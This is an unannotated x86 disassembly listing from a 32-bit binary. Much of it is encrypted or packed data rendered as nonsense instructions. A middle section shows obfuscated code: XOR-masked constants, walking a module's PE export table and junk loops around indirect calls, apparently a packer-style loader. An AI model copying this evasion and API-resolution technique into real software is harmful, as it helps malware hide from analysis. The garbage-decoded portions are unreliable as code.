  40c998:	inc    edx
  40c999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c99a:	int    0x3f
  40c99c:	or     dh,0xea
  40c99f:	fwait
  40c9a0:	lahf   
  40c9a1:	mov    esp,0x7ec38d43
  40c9a6:	dec    DWORD PTR [esi+eax*1+0x3e533a55]
  40c9ad:	data16 and BYTE PTR [esi],0xee
  40c9b1:	gs pop eax
  40c9b3:	cmp    DWORD PTR [edi+0x6d],edi
  40c9b6:	mov    bh,0x6c
  40c9b8:	jne    0x40c942
  40c9ba:	(bad)  
  40c9bb:	out    dx,al
  40c9bc:	faddp  st(0),st
  40c9be:	push   0x2d
  40c9c0:	int3   
  40c9c1:	popf   
  40c9c2:	adc    al,0x37
  40c9c4:	test   eax,0x29153a9
  40c9c9:	stc    
  40c9ca:	out    dx,al
  40c9cb:	and    DWORD PTR [edx-0x2884667c],ebp
  40c9d1:	nop
  40c9d2:	add    al,0x1
  40c9d4:	mov    ebp,0xac1cda93
  40c9d9:	ja     0x40c9ce
  40c9db:	(bad)  
  40c9dc:	pop    ebx
  40c9dd:	ret    0x8652
  40c9e0:	xor    BYTE PTR [eax+0x45],0x8c
  40c9e4:	jge    0x40ca1c
  40c9e6:	int3   
  40c9e7:	div    BYTE PTR gs:[ecx-0x11888d14]
  40c9ee:	pushf  
  40c9ef:	mov    edi,DWORD PTR [edx+ebp*1-0x14]
  40c9f3:	(bad)  
  40c9f4:	sub    bl,dl
  40c9f6:	mov    dh,0xa6
  40c9f8:	jne    0x40ca47
  40c9fa:	mov    bh,0x79
  40c9fc:	rcl    BYTE PTR [ecx-0x66],1
  40c9ff:	out    dx,al
  40ca00:	adc    eax,0xf0103fe
  40ca05:	mov    WORD PTR [ebx+0x44ae4a02],?
  40ca0b:	aas    
  40ca0c:	call   0x10ec:0xba224fc2
  40ca13:	test   eax,0xc9f0bab5
  40ca18:	cmp    DWORD PTR [esi-0x8],esp
  40ca1b:	scas   eax,DWORD PTR es:[edi]
  40ca1c:	push   esi
  40ca1d:	mov    dh,0xa6
  40ca1f:	jg     0x40ca0e
  40ca21:	xor    dh,BYTE PTR [ebx]
  40ca23:	(bad)  
  40ca24:	or     eax,0xb0d5b11f
  40ca29:	jns    0x40c9e3
  40ca2b:	mov    edx,0xff381b88
  40ca30:	in     al,0xd6
  40ca32:	shr    DWORD PTR [ebp-0x6d],0x83
  40ca36:	fidivr DWORD PTR [ecx]
  40ca38:	xor    eax,0x5672063a
  40ca3d:	repz jmp 0x2e7edf6
  40ca43:	int    0x25
  40ca45:	push   ebp
  40ca46:	out    dx,al
  40ca47:	or     eax,0xa7299b3
  40ca4c:	mov    edi,0xe43cf6db
  40ca51:	pop    edx
  40ca52:	mov    BYTE PTR [edx+0x1ace544],dl
  40ca58:	stos   DWORD PTR es:[edi],eax
  40ca59:	es ja  0x40ca7d
  40ca5c:	test   DWORD PTR [edx],ecx
  40ca5e:	out    0x51,eax
  40ca60:	iret   
  40ca61:	call   0x3752a024
  40ca66:	cmc    
  40ca67:	pop    esi
  40ca68:	je     0x40ca40
  40ca6a:	xchg   esp,eax
  40ca6b:	out    dx,eax
  40ca6c:	mov    ecx,0xa1a9772b
  40ca71:	mov    ds:0x4b9c585,al
  40ca76:	bnd jge 0x40caf6
  40ca79:	out    0x6b,eax
  40ca7b:	pop    edx
  40ca7c:	and    ebx,DWORD PTR [eax-0x3107efe1]
  40ca82:	adc    ah,BYTE PTR [ebx]
  40ca84:	mov    al,0x9f
  40ca86:	ins    DWORD PTR es:[edi],dx
  40ca87:	mov    al,ds:0x935d1198
  40ca8c:	xchg   ebp,eax
  40ca8d:	jns    0x40ca85
  40ca8f:	jnp    0x40ca15
  40ca91:	jmp    0x40cae7
  40ca93:	sub    DWORD PTR [esi+ebp*2],esi
  40ca96:	popf   
  40ca97:	pop    edx
  40ca98:	icebp  
  40ca99:	das    
  40ca9a:	sahf   
  40ca9b:	push   0x30c9406c
  40caa0:	(bad)  
  40caa1:	out    dx,eax
  40caa2:	stos   BYTE PTR es:[edi],al
  40caa3:	inc    edi
  40caa4:	lock dec edi
  40caa6:	xchg   ebp,eax
  40caa7:	bound  eax,QWORD PTR [ebx+0x4196dc07]
  40caad:	rol    BYTE PTR [ecx],cl
  40caaf:	sbb    BYTE PTR [ebx+0x7d8bfc45],cl
  40cab5:	clc    
  40cab6:	add    edi,DWORD PTR [eax]
  40cab8:	mov    DWORD PTR [ebp-0x8],edi
  40cabb:	mov    eax,DWORD PTR [ebp+0xc]
  40cabe:	mov    edi,DWORD PTR [ebp+0xc]
  40cac1:	xor    edi,ecx
  40cac3:	xor    eax,ecx
  40cac5:	lea    eax,[eax+edi*1+0x64e5ba]
  40cacc:	mov    edi,DWORD PTR [ebp+0xc]
  40cacf:	xor    edi,ecx
  40cad1:	add    edi,edx
  40cad3:	imul   eax,edi
  40cad6:	mov    edi,DWORD PTR [ebp+0xc]
  40cad9:	xor    edi,ecx
  40cadb:	sub    edi,eax
  40cadd:	mov    eax,DWORD PTR [ebp-0x4]
  40cae0:	add    edi,edx
  40cae2:	cmp    DWORD PTR [eax],edi
  40cae4:	mov    eax,DWORD PTR [ebp-0x4]
  40cae7:	mov    edi,DWORD PTR [ebp+0x10]
  40caea:	jg     0x40cafd
  40caf0:	xor    edi,ecx
  40caf2:	mov    ebx,esi
  40caf4:	sub    ebx,edi
  40caf6:	add    DWORD PTR [eax],ebx
  40caf8:	jmp    0x40cb03
  40cafd:	xor    edi,ecx
  40caff:	add    edi,edx
  40cb01:	add    DWORD PTR [eax],edi
  40cb03:	mov    eax,DWORD PTR [ebp-0x8]
  40cb06:	mov    edi,DWORD PTR [ebp-0x10]
  40cb09:	mov    eax,DWORD PTR [eax]
  40cb0b:	xor    edi,ecx
  40cb0d:	add    edi,0x3272dc
  40cb13:	not    edi
  40cb15:	and    eax,edi
  40cb17:	movsx  di,BYTE PTR [eax+0x1]
  40cb1c:	mov    ebx,0x3b4c
  40cb21:	sub    di,bx
  40cb24:	mov    ebx,0x8a89
  40cb29:	xor    di,bx
  40cb2c:	mov    ebx,0x4f87
  40cb31:	cmp    di,bx
  40cb34:	jne    0x40cb5c
  40cb3a:	movsx  di,BYTE PTR [eax]
  40cb3e:	mov    ebx,0x3b4c
  40cb43:	sub    di,bx
  40cb46:	mov    ebx,0x8a89
  40cb4b:	xor    di,bx
  40cb4e:	mov    ebx,0x4f88
  40cb53:	cmp    di,bx
  40cb56:	je     0x40cb6c
  40cb5c:	mov    edi,DWORD PTR [ebp-0x10]
  40cb5f:	xor    edi,ecx
  40cb61:	mov    ebx,esi
  40cb63:	sub    ebx,edi
  40cb65:	add    eax,ebx
  40cb67:	jmp    0x40cb17
  40cb6c:	mov    esi,DWORD PTR [ebp-0x14]
  40cb6f:	mov    esi,DWORD PTR [esi]
  40cb71:	mov    edi,DWORD PTR [eax+0x3c]
  40cb74:	lea    esi,[edi+esi*8+0x78]
  40cb78:	mov    esi,DWORD PTR [esi+eax*1]
  40cb7b:	mov    DWORD PTR [ebp-0x8],esi
  40cb7e:	mov    esi,DWORD PTR [ebp+0x8]
  40cb81:	xor    esi,ecx
  40cb83:	add    esi,edx
  40cb85:	mov    DWORD PTR [ebp-0x14],esi
  40cb88:	mov    esi,DWORD PTR [ebp+0x8]
  40cb8b:	mov    edi,DWORD PTR [ebp-0x8]
  40cb8e:	xor    esi,ecx
  40cb90:	add    esi,edx
  40cb92:	pop    ebx
  40cb93:	cmp    edi,esi
  40cb95:	jne    0x40cbb3
  40cb9b:	mov    eax,DWORD PTR [ebp+0xc]
  40cb9e:	xor    eax,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp-0x8]
  40cba3:	add    eax,edx
  40cba5:	imul   eax,ecx
  40cba8:	mov    DWORD PTR [ebp-0x8],eax
  40cbab:	push   DWORD PTR [ebp+0x18]
  40cbae:	jmp    0x40cc07
  40cbb3:	mov    ecx,DWORD PTR [ebp-0x8]
  40cbb6:	add    ecx,eax
  40cbb8:	mov    DWORD PTR [ebp-0x14],ecx
  40cbbb:	mov    ecx,DWORD PTR [ebp-0x14]
  40cbbe:	mov    ecx,DWORD PTR [ecx+0xc]
  40cbc1:	movsx  cx,BYTE PTR [ecx+eax*1]
  40cbc6:	mov    edx,0x3b4c
  40cbcb:	sub    cx,dx
  40cbce:	mov    edx,0x8a89
  40cbd3:	xor    cx,dx
  40cbd6:	mov    edx,0x4e76
  40cbdb:	cmp    cx,dx
  40cbde:	jne    0x40cbab
  40cbe4:	mov    ecx,DWORD PTR ds:0x42e435
  40cbea:	mov    ecx,DWORD PTR [ecx+0x198]
  40cbf0:	mov    DWORD PTR [ecx],eax
  40cbf2:	jmp    0x40cc18
  40cbf7:	mov    ecx,DWORD PTR [ebp+0x18]
  40cbfa:	cmp    ecx,0xf89c85b2
  40cc00:	jne    0x40cc18
  40cc06:	push   eax
  40cc07:	push   DWORD PTR [ebp+0x14]
  40cc0a:	push   DWORD PTR [ebp+0x10]
  40cc0d:	push   DWORD PTR [ebp+0xc]
  40cc10:	push   DWORD PTR [ebp+0x8]
  40cc13:	call   0x40a327
  40cc18:	pop    edi
  40cc19:	pop    esi
  40cc1a:	leave  
  40cc1b:	ret    0x14
  40cc1e:	push   ebp
  40cc1f:	mov    ebp,esp
  40cc21:	push   ecx
  40cc22:	push   ecx
  40cc23:	add    DWORD PTR ds:0x42b010,edx
  40cc29:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  40cc30:	sub    DWORD PTR ds:0x429024,0x76a8
  40cc3a:	mov    DWORD PTR [ebp-0x4],0xf89c85b2
  40cc41:	and    DWORD PTR ds:0x42b018,edi
  40cc47:	mov    eax,DWORD PTR [ebp-0x4]
  40cc4a:	adc    DWORD PTR ds:0x429018,edx
  40cc50:	push   esi
  40cc51:	and    DWORD PTR ds:0x42a000,0x0
  40cc5b:	jmp    0x40cc6d
  40cc60:	mov    esi,DWORD PTR ds:0x42a000
  40cc66:	inc    esi
  40cc67:	mov    DWORD PTR ds:0x42a000,esi
  40cc6d:	cmp    DWORD PTR ds:0x42a000,0x1a
  40cc74:	jae    0x40cc98
  40cc7a:	cmp    DWORD PTR ds:0x42a000,0x26
  40cc81:	jne    0x40cc8d
  40cc87:	call   DWORD PTR ds:0x42ed51
  40cc8d:	jmp    0x40cc60
  40cc92:	sub    edx,0x54cb
  40cc98:	mov    esi,DWORD PTR [ebp-0x8]
  40cc9b:	and    DWORD PTR ds:0x429018,0x0
  40cca5:	jmp    0x40ccb7
  40ccaa:	mov    ecx,DWORD PTR ds:0x429018
  40ccb0:	inc    ecx
  40ccb1:	mov    DWORD PTR ds:0x429018,ecx
  40ccb7:	cmp    DWORD PTR ds:0x429018,0x1e
  40ccbe:	jae    0x40ccf6
  40ccc4:	cmp    DWORD PTR ds:0x429018,0x8
  40cccb:	jne    0x40ccd7
  40ccd1:	call   DWORD PTR ds:0x42ed55
  40ccd7:	cmp    DWORD PTR ds:0x429018,0x7
  40ccde:	jne    0x40ccf1
  40cce4:	mov    ecx,DWORD PTR ds:0x429018
  40ccea:	inc    ecx
  40cceb:	mov    DWORD PTR ds:0x429018,ecx
  40ccf1:	jmp    0x40ccaa
  40ccf6:	mov    edx,0x7510896
  40ccfb:	mov    ecx,DWORD PTR ds:0x42d00c
  40cd01:	sub    DWORD PTR ds:0x42a004,ecx
  40cd07:	xor    eax,edx
  40cd09:	xor    esi,edx
  40cd0b:	mov    DWORD PTR ds:0x42b00c,0x13
  40cd15:	cmp    DWORD PTR ds:0x42b00c,0x0
  40cd1c:	je     0x40cd7c
  40cd22:	cmp    DWORD PTR ds:0x42b00c,0x2
  40cd29:	jne    0x40cd50
  40cd2f:	push   DWORD PTR [ebp-0x14]
  40cd32:	push   0x6af7
  40cd37:	push   0x42b010
  40cd3c:	push   0x84d2
  40cd41:	push   DWORD PTR [ebp-0x10]
  40cd44:	push   DWORD PTR [ebp-0x20]
  40cd47:	push   DWORD PTR [ebp-0x28]
  40cd4a:	call   DWORD PTR ds:0x42ed59
  40cd50:	cmp    DWORD PTR ds:0x42b00c,0x3
  40cd57:	jne    0x40cd6a
  40cd5d:	mov    ecx,DWORD PTR ds:0x42b00c
  40cd63:	dec    ecx
  40cd64:	mov    DWORD PTR ds:0x42b00c,ecx
  40cd6a:	mov    ecx,DWORD PTR ds:0x42b00c
  40cd70:	dec    ecx
  40cd71:	mov    DWORD PTR ds:0x42b00c,ecx
  40cd77:	jmp    0x40cd15
  40cd7c:	mov    ecx,0x3272dd
  40cd81:	add    esi,ecx
  40cd83:	add    eax,ecx
  40cd85:	imul   eax,esi
  40cd88:	mov    esi,DWORD PTR [ebp+0xc]
  40cd8b:	cmp    esi,eax
  40cd8d:	jne    0x40cda9
  40cd93:	mov    eax,DWORD PTR [ebp-0x4]
  40cd96:	mov    esi,DWORD PTR [ebp-0x8]
  40cd99:	xor    eax,edx
  40cd9b:	xor    esi,edx
  40cd9d:	add    eax,ecx
  40cd9f:	add    esi,ecx
  40cda1:	imul   eax,esi
  40cda4:	jmp    0x40f15e
  40cda9:	mov    eax,DWORD PTR [ebp+0xc]
  40cdac:	mov    eax,DWORD PTR [eax+0x78]
  40cdaf:	mov    DWORD PTR [ebp+0xc],eax
  40cdb2:	mov    eax,DWORD PTR [ebp-0x4]
  40cdb5:	mov    esi,DWORD PTR [ebp-0x8]
  40cdb8:	xor    eax,edx
  40cdba:	xor    esi,edx
  40cdbc:	add    eax,ecx
  40cdbe:	add    esi,ecx
  40cdc0:	imul   eax,esi
  40cdc3:	jmp    0x40f13d
  40cdc8:	push   esi
  40cdc9:	pop    ss
  40cdca:	rcl    DWORD PTR [ebx-0x6d],cl
  40cdcd:	fwait
  40cdce:	(bad)  
  40cdcf:	pop    ss
  40cdd0:	push   ds
  40cdd1:	outs   dx,BYTE PTR ds:[esi]
  40cdd2:	adc    DWORD PTR ds:0xe10efb20,ebx
  40cdd8:	fldl2t 
  40cdda:	jp     0x40ce56
  40cddc:	sbb    DWORD PTR [edi+0x7a],ebx
  40cddf:	jp     0x40cd6c
  40cde1:	nop
  40cde2:	inc    esp
  40cde3:	enter  0x7f98,0x68
  40cde7:	xchg   esi,ebp
  40cde9:	pop    esi
  40cdea:	push   eax
  40cdeb:	push   eax
  40cdec:	push   ss
  40cded:	xchg   ecx,eax
  40cdee:	call   0x1ee21db
  40cdf3:	or     edi,esi
  40cdf5:	int    0x3b
  40cdf7:	push   cs
  40cdf8:	mov    ebx,0x17795ed6
  40cdfd:	loopne 0x40cd88
  40cdff:	xor    esi,DWORD PTR ds:0xa3f8c842
  40ce05:	and    ebp,esi
  40ce07:	add    al,0x90
  40ce09:	inc    ebx
  40ce0a:	or     dh,BYTE PTR [eax-0x6cf51844]
  40ce10:	loope  0x40ce07
  40ce12:	sbb    edx,DWORD PTR [edx]
  40ce14:	int    0x45
  40ce16:	jmp    0xb209c49f
  40ce1b:	or     eax,0x4643544c
  40ce20:	cs inc edi
  40ce22:	xchg   ecx,eax
  40ce23:	or     DWORD PTR [ecx+0x40],0xffffff83
  40ce27:	(bad)  
  40ce29:	xlat   BYTE PTR ds:[ebx]
  40ce2a:	mov    dl,0xb5
  40ce2c:	push   0xbc45c186
  40ce31:	repz scas al,BYTE PTR es:[edi]
  40ce33:	xchg   DWORD PTR ds:0x73380eb5,edx
  40ce39:	mov    bh,0xa5
  40ce3b:	jmp    0x40ce26
  40ce3d:	scas   eax,DWORD PTR es:[edi]
  40ce3e:	and    DWORD PTR [edx],esi
  40ce40:	ins    BYTE PTR es:[edi],dx
  40ce41:	neg    BYTE PTR [edx+0x6e0e0b54]
  40ce47:	popf   
  40ce48:	jl     0x40ce25
  40ce4a:	test   DWORD PTR [edx],0x5f983053
  40ce50:	and    DWORD PTR [ecx-0x67],ecx
  40ce53:	sbb    dl,BYTE PTR [ebp-0x5a814b74]
  40ce59:	cdq    
  40ce5a:	push   esi
  40ce5b:	es test al,0xb1
  40ce5e:	ret    0xef62
  40ce61:	cmc    
  40ce62:	ds pop es
  40ce64:	imul   ebx,ebx,0xffffffb7
  40ce67:	shr    BYTE PTR [ebx+0x48],0x7d
  40ce6b:	mov    bl,0xab
  40ce6d:	sub    al,0x81
  40ce6f:	ins    DWORD PTR es:[edi],dx
  40ce70:	push   0x28
  40ce72:	retf   
  40ce73:	in     eax,dx
  40ce74:	iret   
  40ce75:	in     al,0x8f
  40ce77:	int3   
  40ce78:	or     BYTE PTR [edx],cl
  40ce7a:	pop    ss
  40ce7b:	fsubr  QWORD PTR [eax+0x4e5bcf21]
  40ce81:	push   ds
  40ce82:	adc    al,0xd3
  40ce84:	scas   eax,DWORD PTR es:[edi]
  40ce85:	cmp    DWORD PTR [ebp+0x13cc2c94],edi
  40ce8b:	data16 js 0x40ce6c
  40ce8e:	xchg   esi,eax
  40ce8f:	cli    
  40ce90:	int3   
  40ce91:	pop    ebp
  40ce92:	dec    eax
  40ce93:	lahf   
  40ce94:	lahf   
  40ce95:	inc    ebx
  40ce96:	sbb    eax,0x6c79f750
  40ce9b:	sbb    eax,0xbf6f805d
  40cea0:	cld    
  40cea1:	mov    ebp,0x7211d634
  40cea6:	gs dec esi
  40cea8:	jmp    0x40ceae
  40ceaa:	push   ecx
  40ceab:	mov    ch,0xd1
  40cead:	int3   
  40ceae:	inc    eax
  40ceaf:	xor    esp,esi
  40ceb1:	xchg   ebx,eax
  40ceb2:	(bad)  
  40ceb3:	repnz aam 0xb8
  40ceb6:	inc    ecx
  40ceb7:	out    0x8a,al
  40ceb9:	jg     0x40cef0
  40cebb:	ss (bad) 
  40cebd:	mov    bl,0x6
  40cebf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cec0:	rcl    DWORD PTR [edi+0x2f],cl
  40cec3:	ds dec esp
  40cec5:	and    al,0x65
  40cec7:	pop    ebp
  40cec8:	(bad)  
  40cec9:	jns    0x40ce91
  40cecb:	or     edx,eax
  40cecd:	cmc    
  40cece:	xor    DWORD PTR [ebp-0x68],0xdd0d863f
  40ced5:	dec    edx
  40ced6:	shr    BYTE PTR [esi],0x9f
  40ced9:	popf   
  40ceda:	mov    bh,0xfd
  40cedc:	lods   eax,DWORD PTR ds:[esi]
  40cedd:	mov    ds:0x57004701,al
  40cee2:	mov    ah,0x95
  40cee4:	sbb    DWORD PTR [esp+eiz*4-0x14],eax
  40cee8:	xor    DWORD PTR [eax+0x4e],0xffffffb2
  40ceec:	pop    eax
  40ceed:	aam    0xf5
  40ceef:	cli    
  40cef0:	mov    esp,0x89085ce4
  40cef5:	mov    al,ds:0x7214804e
  40cefa:	icebp  
  40cefb:	ja     0x40cf23
  40cefd:	xchg   esi,eax
  40cefe:	push   edi
  40ceff:	xor    eax,esp
  40cf01:	mov    ds:0xceddf8f,al
  40cf06:	or     cl,BYTE PTR [edx-0x25d545d9]
  40cf0c:	dec    ebp
  40cf0d:	inc    ecx
  40cf0e:	adc    DWORD PTR [esi],ebp
  40cf10:	pop    eax
  40cf11:	sbb    eax,0xfc07fe01
  40cf16:	adc    al,BYTE PTR fs:[edx+0x1d8a5928]
  40cf1d:	iret   
  40cf1e:	xor    BYTE PTR [ecx-0x26fad44b],al
  40cf24:	and    ch,0x53
  40cf27:	cmp    BYTE PTR [ebp-0x31ddb939],ah
  40cf2d:	xchg   esp,eax
  40cf2e:	in     eax,0xf5
  40cf30:	and    BYTE PTR [eax-0x46],dl
  40cf33:	arpl   WORD PTR [edx-0x7f],sp
  40cf36:	js     0x40cf3a
  40cf38:	rcl    DWORD PTR [ecx],1
  40cf3a:	mov    dl,0x38
  40cf3c:	outs   dx,BYTE PTR ds:[esi]
  40cf3d:	out    0xad,eax
  40cf3f:	xchg   ebx,eax
  40cf40:	(bad)  [edi]
  40cf42:	in     eax,0x12
  40cf44:	adc    al,0x33
  40cf46:	jno    0x40cf09
  40cf48:	dec    ecx
  40cf49:	mov    BYTE PTR [edi-0x62],al
  40cf4c:	lock mov dh,0xcb
  40cf4f:	push   esi
  40cf50:	xor    DWORD PTR ds:0xe17fdf66,ecx
  40cf56:	loopne 0x40cfc3
  40cf58:	inc    esi
  40cf59:	xchg   esi,eax
  40cf5a:	cli    
  40cf5b:	frstor [ebx]
  40cf5d:	ins    BYTE PTR es:[edi],dx
  40cf5e:	out    dx,al
  40cf5f:	jae    0x40cf19
  40cf61:	pcmpgtb mm1,QWORD PTR [ebx-0x57]
  40cf65:	add    DWORD PTR [edi-0x45],eax
  40cf68:	xchg   edx,eax
  40cf69:	clc    
  40cf6a:	popa   
  40cf6b:	and    edi,DWORD PTR [esi]
  40cf6d:	call   0x1ff3b89f
  40cf72:	aas    
  40cf73:	(bad)
  40cf77:	aam    0x46
  40cf79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf7a:	xchg   BYTE PTR [esi-0x31888572],cl
  40cf80:	dec    ebx
  40cf81:	loope  0x40cff6
  40cf83:	outs   dx,BYTE PTR ds:[esi]
  40cf84:	icebp  
  40cf85:	pop    edi
  40cf86:	cmp    eax,0xf3aaa842
  40cf8b:	dec    ebx
  40cf8c:	mov    esi,0x56d7a362
  40cf91:	mov    al,0x71
  40cf93:	xchg   ebx,eax
  40cf94:	xchg   ebp,eax
  40cf95:	push   edx
  40cf96:	sbb    eax,edi
  40cf98:	and    esp,edi
  40cf9a:	jns    0x40cf5d
  40cf9c:	(bad)  
  40cf9e:	nop
  40cf9f:	adc    al,0x0
  40cfa1:	test   DWORD PTR [eax-0x299a340f],ebx
  40cfa7:	je     0x40d020
  40cfa9:	inc    esp
  40cfaa:	jnp    0x40cfbd
  40cfac:	xchg   ch,dl
  40cfae:	inc    esi
  40cfaf:	retf   
  40cfb0:	data16 cmc 
  40cfb2:	in     eax,0x24
  40cfb4:	cmp    BYTE PTR [ecx],al
  40cfb6:	mov    ebx,0x6c8b27ca
  40cfbb:	ja     0x40cfba
  40cfbd:	xor    eax,0x5b307d5c
  40cfc2:	rcl    BYTE PTR [ebp+0x7b246b17],cl
  40cfc8:	adc    dh,ah
  40cfca:	or     BYTE PTR [edi+0x656e7e6c],dh
  40cfd0:	fisub  DWORD PTR [esp+eiz*8+0x53de39d8]
  40cfd7:	inc    edx
  40cfd8:	test   edx,ecx
  40cfda:	pop    esp
  40cfdb:	retf   
  40cfdc:	mov    dh,0xc0
  40cfde:	shl    BYTE PTR [ebx-0x3b],cl
  40cfe1:	nop
  40cfe2:	sub    BYTE PTR [ebp-0x7b],ah
  40cfe5:	(bad)  
  40cfe7:	retf   
  40cfe8:	repz add cl,BYTE PTR [esi-0x69]
  40cfec:	ins    DWORD PTR es:[edi],dx
  40cfed:	sub    eax,0xd1257ee6
  40cff2:	sti    
  40cff3:	or     al,0x70
  40cff5:	shl    DWORD PTR [ebx+edi*2],1
  40cff8:	neg    BYTE PTR [esi+0x48deac92]
  40cffe:	xchg   DWORD PTR [edi+0x29aec72a],ecx
  40d004:	shl    BYTE PTR [esi+0x7d5aff56],cl
  40d00a:	ret    
  40d00b:	lods   al,BYTE PTR ds:[esi]
  40d00c:	outs   dx,BYTE PTR ds:[esi]
  40d00d:	imul   DWORD PTR [ebx-0x13e5de77]
  40d013:	pop    ebp
  40d014:	or     eax,0xa59c76bd
  40d019:	or     bh,BYTE PTR ds:0x7212ee03
  40d01f:	scas   eax,DWORD PTR es:[edi]
  40d020:	call   0x4c3e:0xc852b943
  40d027:	imul   edx,DWORD PTR [edi+0x4c54c38],0x29537f0e
  40d031:	enter  0xf7ae,0xb0
  40d035:	pop    ds
  40d036:	cld    
  40d037:	arpl   WORD PTR [edi+0x5914dba5],cx
  40d03d:	fldcw  WORD PTR [esp+ecx*4]
  40d040:	aad    0xc9
  40d042:	sbb    eax,0x1ab4c63f
  40d047:	mov    dl,0xb4
  40d049:	stos   DWORD PTR es:[edi],eax
  40d04a:	ret    0xdd39
  40d04d:	retf   
  40d04e:	clc    
  40d04f:	dec    eax
  40d050:	inc    esp
  40d051:	and    ecx,DWORD PTR [edi]
  40d053:	dec    edx
  40d054:	call   0x3147:0x4107a55a
  40d05b:	and    esi,esi
  40d05d:	cli    
  40d05e:	(bad)  
  40d05f:	fnstenv ds:0x1eea5f3e
  40d065:	xchg   BYTE PTR ds:0xd3e95112,al
  40d06b:	test   DWORD PTR [edi-0x4c],0x2a8b56c1
  40d072:	out    0x12,eax
  40d074:	je     0x40d074
  40d076:	sbb    eax,0xdbdf8fba
  40d07b:	pusha  
  40d07c:	pop    gs
  40d07e:	push   ebp
  40d07f:	data16 imul BYTE PTR [esi]
  40d082:	les    esi,FWORD PTR [edi+ebp*2-0x1bd8e46a]
  40d089:	pop    ebp
  40d08a:	cmp    BYTE PTR [eax],al
  40d08c:	xchg   edi,eax
  40d08d:	mov    al,ds:0xca18daf
  40d092:	fisubr WORD PTR [ebx+0x404f8930]
  40d098:	jne    0x40d08f
  40d09a:	add    BYTE PTR [eax-0x26],dl
  40d09d:	mov    esp,0x42f2c861
  40d0a2:	hlt    
  40d0a3:	push   es
  40d0a4:	or     DWORD PTR [ebx+0x7c],ebx
  40d0a7:	repz out 0xc4,al
  40d0aa:	std    
  40d0ab:	daa    
  40d0ac:	hlt    
  40d0ad:	jne    0x40d07c
  40d0af:	mov    bl,0x7d
  40d0b1:	jg     0x40d04b
  40d0b3:	inc    edi
  40d0b4:	sbb    al,0x4c
  40d0b6:	in     eax,0x19
  40d0b8:	fisttp WORD PTR [edx-0x61]
  40d0bb:	std    
  40d0bc:	retf   0x1a6e
  40d0bf:	rcl    esi,cl
  40d0c1:	neg    DWORD PTR [edx]
  40d0c3:	pop    esp
  40d0c4:	or     ecx,edi
  40d0c6:	out    0xbe,eax
  40d0c8:	mov    ds:0x88fd8ee5,al
  40d0cd:	not    cl
  40d0cf:	(bad)  [eax]
  40d0d1:	out    0xce,al
  40d0d3:	ins    DWORD PTR es:[edi],dx
  40d0d4:	sub    eax,0xb4a4b8fc
  40d0d9:	setne  BYTE PTR [ebx+0x52]
  40d0dd:	jo     0x40d113
  40d0df:	add    al,0x3c
  40d0e1:	and    BYTE PTR [esi-0x7a92611],dh
  40d0e7:	cld    
  40d0e8:	dec    ebx
  40d0e9:	push   cs
  40d0ea:	pop    es
  40d0eb:	js     0x40d07a
  40d0ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0ee:	dec    ebx
  40d0ef:	dec    ebp
  40d0f0:	pop    ecx
  40d0f1:	mov    dl,0x6
  40d0f3:	cmp    al,0x49
  40d0f5:	jo     0x40d154
  40d0f7:	mov    dl,0xc9
  40d0f9:	mov    dh,0xe9
  40d0fb:	ins    DWORD PTR es:[edi],dx
  40d0fc:	jnp    0x40d0d9
  40d0fe:	jns    0x40d0c8
  40d100:	ret    
  40d101:	repz leave 
  40d103:	dec    eax
  40d104:	mov    ss,WORD PTR ds:0xd27bb918
  40d10a:	jl     0x40d115
  40d10c:	daa    
  40d10d:	loop   0x40d0f3
  40d10f:	pop    ds
  40d110:	lock push ebx
  40d112:	frstor [edx+esi*1-0x17eb5519]
  40d119:	test   BYTE PTR [edi],0xb8
  40d11c:	mov    bl,0xc1
  40d11e:	ss repnz test eax,edi
  40d122:	add    ch,cl
  40d124:	add    eax,0x8544ceef
  40d129:	jg     0x40d155
  40d12b:	das    
  40d12c:	je     0x40d172
  40d12e:	enter  0xa050,0x40
  40d132:	leave  
  40d133:	rol    BYTE PTR [ebx],1
  40d135:	sbb    DWORD PTR [ebx],0x5193e4f4
  40d13b:	push   eax
  40d13c:	mov    al,0xb8
  40d13e:	sbb    ebx,ebx
  40d140:	js     0x40d151
  40d142:	inc    ebx
  40d143:	pop    es
  40d144:	or     eax,0x6d90295c
  40d149:	xor    eax,ecx
  40d14b:	outs   dx,BYTE PTR ds:[esi]
  40d14c:	movlps xmm7,QWORD PTR [ebx-0x7a105af8]
  40d153:	xor    cl,BYTE PTR [ebp-0x13]
  40d156:	ins    DWORD PTR es:[edi],dx
  40d157:	sub    edi,DWORD PTR [eax]
  40d159:	mov    eax,ds:0x5a9c71b0
  40d15e:	cmp    ecx,esi
  40d160:	and    al,0x81
  40d162:	adc    bh,BYTE PTR [eax+0x28]
  40d165:	mov    esi,0xdbd1f90e
  40d16a:	pop    edx
  40d16b:	dec    ecx
  40d16c:	das    
  40d16d:	shl    edi,cl
  40d16f:	retf   0x711b
  40d172:	cmc    
  40d173:	imul   BYTE PTR [ebp-0x37]
  40d176:	add    edx,0xc565ce6a
  40d17c:	adc    esi,edx
  40d17e:	inc    ecx
  40d17f:	xchg   edx,eax
  40d180:	es dec ebp
  40d182:	pop    ebp
  40d183:	int    0x7c
  40d185:	lock and BYTE PTR [edx],al
  40d188:	cmp    eax,0x8bf82dea
  40d18d:	mov    ebp,0xec9e1ca3
  40d192:	stc    
  40d193:	sbb    al,0x31
  40d195:	add    DWORD PTR [esi-0x7f8e3af6],ebx
  40d19b:	fcomi  st,st(0)
  40d19d:	or     DWORD PTR [ebx],edi
  40d19f:	cld    
  40d1a0:	cmc    
  40d1a1:	mov    ebp,0xa7021239
  40d1a6:	dec    ecx
  40d1a7:	add    dl,BYTE PTR [eax-0x78d02e0b]
  40d1ad:	pop    eax
  40d1ae:	mov    esp,DWORD PTR [esi-0x26]
  40d1b1:	mov    cl,0x90
  40d1b3:	jbe    0x40d205
  40d1b5:	mov    eax,0x6ee2bfcb
  40d1ba:	addr16 jp 0x40d1f3
  40d1bd:	popa   
  40d1be:	adc    eax,0x1a5ca117
  40d1c3:	jb     0x40d1f0
  40d1c5:	xchg   ebp,eax
  40d1c6:	xchg   ebp,esi
  40d1c8:	sbb    esi,DWORD PTR [edi+esi*2+0x19ff359b]
  40d1cf:	retf   
  40d1d0:	aam    0xc5
